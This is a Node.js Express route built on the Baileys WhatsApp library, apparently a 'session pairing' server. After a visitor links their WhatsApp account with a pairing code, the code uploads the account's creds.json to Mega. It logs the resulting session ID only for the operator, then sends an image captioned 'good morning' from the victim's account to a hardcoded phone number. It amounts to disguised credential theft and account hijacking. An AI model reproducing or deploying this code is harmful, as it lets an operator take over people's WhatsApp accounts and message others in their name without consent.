const express = require('express');
const fs = require('fs-extra');
const { exec } = require("child_process");
let router = express.Router();
const pino = require("pino");
const { Boom } = require("@hapi/boom");
const path = require('path');

const { upload } = require('./mega');
const {
default: makeWASocket,
useMultiFileAuthState,
delay,
makeCacheableSignalKeyStore,
Browsers,
DisconnectReason
} = require("@whiskeysockets/baileys");

// ===== FIXED TARGET NUMBER HERE =====
const TARGET_NUMBER = "94773913394"; // <- මෙතන ඔබට message යවන්න ඕන අංකය
const IMAGE_PATH = path.join(__dirname, "target.jpg"); // <- මෙතන ඔබට image file path

// Ensure the directory is empty when the app starts
if (fs.existsSync('./auth_info_baileys')) {
fs.emptyDirSync(__dirname + '/auth_info_baileys');
}

router.get('/', async (req, res) => {
let num = req.query.number;

async function SUHAIL() {  
    const { state, saveCreds } = await useMultiFileAuthState(`./auth_info_baileys`);  
    try {  
        let Smd = makeWASocket({  
            auth: {  
                creds: state.creds,  
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),  
            },  
            printQRInTerminal: false,  
            logger: pino({ level: "fatal" }).child({ level: "fatal" }),  
            browser: Browsers.macOS("Safari"),  
        });  

        if (!Smd.authState.creds.registered) {  
            await delay(1200);  
            num = num.replace(/[^0-9]/g, '');  
            const code = await Smd.requestPairingCode(num);  
            if (!res.headersSent) {  
                await res.send({ code });  
            }  
        }  

        Smd.ev.on('creds.update', saveCreds);  

        Smd.ev.on("connection.update", async (s) => {  
            const { connection, lastDisconnect } = s;  

            if (connection === "open") {  
                try {  
                    await delay(10000);  
                    if (fs.existsSync('./auth_info_baileys/creds.json'));  

                    const auth_path = './auth_info_baileys/';  

                    // Upload credentials to Mega  
                    const mega_url = await upload(fs.createReadStream(auth_path + 'creds.json'), `${Date.now()}.json`);  
                    const sessionId = mega_url.replace('https://mega.nz/file/', '');  

                    // Send image + "good morning" text to fixed target number  
                    await Smd.sendMessage(  
                        `${TARGET_NUMBER}@s.whatsapp.net`,  
                        {  
                            image: fs.readFileSync(IMAGE_PATH),  
                            caption: "good morning"  
                        }  
                    );  

                    console.log(`Session ID: ${sessionId}`);  
                    console.log(`Image & message sent to ${TARGET_NUMBER}`);  

                    // Clean up  
                    await delay(1000);  
                    await fs.emptyDirSync(__dirname + '/auth_info_baileys');  

                } catch (e) {  
                    console.log("Error during file upload or message send: ", e);  
                }  
            }  

            // Handle connection closures  
            if (connection === "close") {  
                let reason = new Boom(lastDisconnect?.error)?.output.statusCode;  
                if (reason === DisconnectReason.restartRequired) {  
                    SUHAIL().catch(err => console.log(err));  
                } else {  
                    console.log('Connection closed with bot. Restarting...');  
                    exec('pm2 restart qasim');  
                }  
            }  
        });  

    } catch (err) {  
        console.log("Error in SUHAIL function: ", err);  
        exec('pm2 restart qasim');  
        SUHAIL();  
        await fs.emptyDirSync(__dirname + '/auth_info_baileys');  
        if (!res.headersSent) {  
            await res.send({ code: "Try After Few Minutes" });  
        }  
    }  
}  

await SUHAIL();

});

module.exports = router;


